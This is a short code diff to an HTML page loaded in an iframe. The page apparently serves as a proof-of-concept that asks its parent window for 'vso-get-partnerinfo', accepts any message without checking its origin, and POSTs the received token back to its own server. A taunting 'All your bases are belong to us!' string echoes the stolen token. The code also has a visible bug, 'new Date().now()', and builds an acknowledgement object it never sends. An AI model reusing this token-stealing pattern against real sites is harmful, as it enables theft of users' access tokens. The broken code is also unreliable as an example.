@@ -10,22 +10,29 @@ function getHtml(body) {
 <html>
   <head>
     <script>
+      const guid = new Date().now();
       window.onload = function() {
         const payload = {
-          id: '<guid-1>',
+          id: guid,
           type: 'vso-get-partnerinfo'
         }
         window.top.postMessage(payload, '*');
       }
       window.addEventListener("message", receiveMessage, false);
-      function acknowledgeMessage() {
+      function acknowledgeMessage(token, guid) {
+        const ack = {
+          id: guid,
+          result: 'success',
+          message: 'All your bases are belong to us! token: ' + token + ', id: ' + guid
+      }
         window.top.postMessage('success', '*');
       }
       function receiveMessage(event) {
         console.log('in iframe, message received: ', event.data.token);
         if (event && event.data && event.data.token) {
           const token = event.data.token;
-          acknowledgeMessage();
+          const guid = event.data.responseId;
+          acknowledgeMessage(token, guid);
           fetch('./', { method: "POST", headers: { "Content-Type": "application/x-www-form-urlencoded" }, body: "token=" + token})
             .then((response) => { 
               if (response.ok) { 
